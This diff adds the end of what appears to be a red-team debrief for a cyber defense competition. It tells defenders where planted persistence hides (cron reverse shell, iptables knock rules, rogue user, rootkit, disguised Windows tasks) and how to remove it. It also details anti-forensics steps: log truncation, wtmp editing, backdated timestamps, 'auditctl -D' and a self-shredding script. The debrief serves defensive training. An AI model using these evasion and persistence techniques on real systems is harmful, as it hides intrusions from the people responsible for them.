+    Reboot cron:
+      cat /etc/cron.d/iptables-compat-restore
+    systemd units:
+      systemctl status ufw-compat
+      systemctl status iptables-compat
+    Knock state tables (active knock tracking):
+      ls /proc/net/xt_recent/
+      Look for: knock_1, knock_2, knock_3
+
+  How to stop and remove:
+    iptables -F     (flush all rules — WARNING: this removes ALL firewall rules)
+    iptables -X     (delete all custom chains)
+    rm -f /etc/iptables/knockknock.rules
+    rm -f /etc/cron.d/iptables-compat-restore
+    systemctl disable --now ufw-compat iptables-compat
+    rm -f /etc/systemd/system/ufw-compat.service
+    rm -f /etc/systemd/system/iptables-compat.service
+    Note: if you had legitimate iptables rules before, restore them from YOUR
+      backup after flushing (the rogue rules mixed in with yours)
+
+
+--------------------------------------------------------------------------------
+  MODULE 8 — VanishingAct (T1070)
+  Anti-forensics — evidence eraser, always runs LAST, passphrase-gated.
+  If this module ran, logs are gone — but the PERSISTENT mechanisms above
+  (iptables rules, timers, cron, users, SSH keys, rootkit) are NOT removed
+  and can still be found using the guidance above.
+--------------------------------------------------------------------------------
+
+  What was done (if this module ran):
+    Process masqueraded as [kworker/u4:1] while running (ps shows fake name)
+    Logs truncated to 0 bytes (truncated, not deleted — inodes remain):
+      /var/log/auth.log      (Ubuntu) or /var/log/secure (Fedora/RHEL)
+      /var/log/syslog
+      /var/log/audit/audit.log
+      /var/log/dnf.log       (Fedora/RHEL)
+      /var/log/dpkg.log      (Ubuntu)
+    wtmp, utmp, and lastlog surgically edited using Python3 struct parsing:
+      Only the operator's own session entries were removed from:
+        /var/log/wtmp, /var/run/utmp, /var/log/lastlog
+      Other users' sessions left intact (surgical, not bulk wipe)
+    Shell history wiped for root and all users in /home
+      .bash_history, .zsh_history shredded
+    File timestamps of ALL Phase 2 artifacts set to 2019
+      (matches system file era — they look like old installed files)
+    auditd rules flushed: auditctl -D  (no rules survive)
+    Staging directories overwritten with random data and deleted (shred -zu)
+    Script shredded itself (shred -zu $0) — no script file remains
+
+  Signs that VanishingAct ran on your box:
+    wc -c /var/log/auth.log      returns 0
+    last                         shows no sessions for the attack window
+    ausearch -ts today           returns no results
+    auditctl -l                  returns "No rules" (all rules flushed)
+    File timestamps on /var/lib/.p2_state and any remaining Phase 2 files
+      all show dates in 2019 regardless of when the attack occurred
+    find /var/log -size 0        returns auth.log, syslog, audit.log
+    No script file in any staging directory
+
+  What still survives after VanishingAct:
+    iptables rules (KnockKnock chains)
+    systemd timers (chef-maint.timer, infra-maint.timer)
+    cron jobs (/etc/cron.d/infra-health-check, iptables-compat-restore)
+    Rogue users (sysmon)
+    SSH authorized_keys entries
+    Chef cookbook (/var/chef/cookbooks/base_config/)
+    Fallback script (/usr/lib/.sysops/)
+    Kernel module if still loaded (KernelSneak)
+    initramfs hook (BootStrap)
+    Docker image tampering (DockerPoisoner)
+    Use all the "Where to find it" sections above — VanishingAct removes
+    evidence but does NOT undo any of the persistent mechanisms.
+
+
+================================================================================
+  QUICK REFERENCE — ALL ARTIFACT LOCATIONS
+================================================================================
+
+WINDOWS
+  Staging dir (everything lands here):
+    C:\Windows\System32\spool\drivers\color\  (use dir /a to see hidden files)
+  Scheduled tasks planted:
+    CCDC-DNS-Redeploy
+    CCDC-FTP-Redeploy
+    CCDC-IIS-Redeploy
+    \Microsoft\Windows\WindowsUpdate\USOSessionWorker   (BackgroundBeef)
+    \Microsoft\Windows\WindowsUpdate\ChocolateyMaintenance
+  Services planted:
+    NdisFilterHelper  (WhosThere sniffer)
+  Files planted:
+    ndisflt.exe          C:\Windows\System32\spool\drivers\color\
+    wu-cache.ps1         C:\Windows\System32\spool\drivers\color\
+    wu-telemetry.ps1     C:\Windows\System32\spool\drivers\color\
+    wu-notify.ps1        C:\Windows\System32\spool\drivers\color\
+    pkgs\                C:\Windows\System32\spool\drivers\color\pkgs\
+    .p2_state.csv        C:\Windows\System32\spool\drivers\color\
+  Firewall rules planted:
+    "Windows Network Diagnostics (TCP-Out)"
+    "Windows Update Health Check"
+    "Windows Update Service Agent"
+    Blocks on ports: 53, 21, 50000-50100, 80, 443, 389, 636, 3268, 3269
+
+LINUX
+  State file:            /var/lib/.p2_state
+  Chef cookbook:         /var/chef/cookbooks/base_config/
+  Chef config:           /etc/chef/client.rb
+  Chef log:              /var/log/chef/client.log
+  Fallback script:       /usr/lib/.sysops/infra_maint.sh
+  Cron (reverse shell):  /etc/cron.d/infra-health-check
+  Cron (iptables):       /etc/cron.d/iptables-compat-restore
+  iptables rules:        /etc/iptables/knockknock.rules
+  systemd timers:        chef-maint.timer  /  infra-maint.timer
+  systemd units:         ufw-compat.service  /  iptables-compat.service
+  Rogue user:            sysmon
+  initramfs hook dir:    /etc/initramfs-tools/hooks/  or  /etc/dracut.conf.d/
+  LD_PRELOAD rootkit:    /etc/ld.so.preload  (if KernelSneak used fallback)
+
+================================================================================
+  END OF DEBRIEF
+================================================================================
